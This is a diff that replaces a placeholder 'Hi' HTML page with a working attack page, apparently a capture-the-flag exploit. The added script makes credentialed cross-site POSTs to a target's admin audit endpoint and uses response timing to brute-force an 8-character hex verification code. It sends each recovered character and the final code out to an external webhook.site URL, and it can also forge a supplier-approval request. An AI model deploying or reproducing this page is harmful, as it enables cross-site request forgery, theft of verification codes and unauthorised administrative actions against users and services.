@@ -1,11 +1,76 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hi</title>
-</head>
-<body>
-    <h1>Hi</h1>
-</body>
-</html>
+<!doctype html>
+<meta charset="utf-8">
+<script>
+const qs = new URLSearchParams(location.search);
+const BASE = qs.get('base');
+const EMAIL = qs.get('email');
+const USER_ID = qs.get('id');
+const WEBHOOK = 'https://webhook.site/58ae5fec-ef49-410e-8853-d01f569adfc0';
+
+function rawJson(obj) {
+  return new TextEncoder().encode(JSON.stringify(obj));
+}
+
+async function blindPost(path, obj) {
+  try {
+    await fetch(BASE + path, {
+      method: 'POST',
+      credentials: 'include',
+      mode: 'no-cors',
+      body: rawJson(obj)
+    });
+  } catch {}
+}
+
+async function exfil(step, value) {
+  try {
+    await fetch(WEBHOOK + '?step=' + encodeURIComponent(step) + '&x=' + encodeURIComponent(value), {
+      mode: 'no-cors'
+    });
+  } catch {}
+}
+
+async function timePattern(pattern) {
+  const started = performance.now();
+  await blindPost('/api/admin/audit/report', {
+    userField: ['email', 'verificationCode'],
+    userValue: [EMAIL, pattern]
+  });
+  return performance.now() - started;
+}
+
+async function bruteCode() {
+  const HEX = '0123456789ABCDEF';
+  const code = Array(8).fill('_');
+
+  for (let pos = 0; pos < 8; pos++) {
+    let best = '0';
+    let bestDt = -1;
+
+    for (const ch of HEX) {
+      const pat = code.map((c, i) => i === pos ? ch : c).join('');
+      const dt = await timePattern(pat);
+      if (dt > bestDt) {
+        bestDt = dt;
+        best = ch;
+      }
+    }
+
+    code[pos] = best;
+    await exfil('progress', code.join(''));
+  }
+
+  return code.join('');
+}
+
+(async () => {
+  if (qs.get('approve') === '1') {
+    await blindPost('/api/admin/suppliers/approve', { id: Number(USER_ID) });
+    await exfil('approve', USER_ID);
+    return;
+  }
+
+  const code = await bruteCode();
+  await exfil('code', code);
+})();
+</script>
